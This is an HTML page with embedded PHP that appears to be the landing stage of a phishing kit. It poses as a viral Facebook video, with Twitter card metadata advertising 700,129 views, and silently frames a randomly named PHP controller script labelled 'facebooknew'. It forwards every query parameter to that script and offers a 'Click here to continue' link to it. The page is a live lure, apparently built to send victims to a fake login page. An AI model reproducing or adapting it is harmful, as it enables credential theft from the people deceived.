
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="700,129 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER68838814-373c-4fde-9a11-4c42f44bfab1.php?source=.%2Fpublic%2FACCESSS0f99caae-b349-447a-803d-4bc8acd19268&lan=facebooknew&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER68838814-373c-4fde-9a11-4c42f44bfab1.php?source=.%2Fpublic%2FACCESSS0f99caae-b349-447a-803d-4bc8acd19268&lan=facebooknew&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   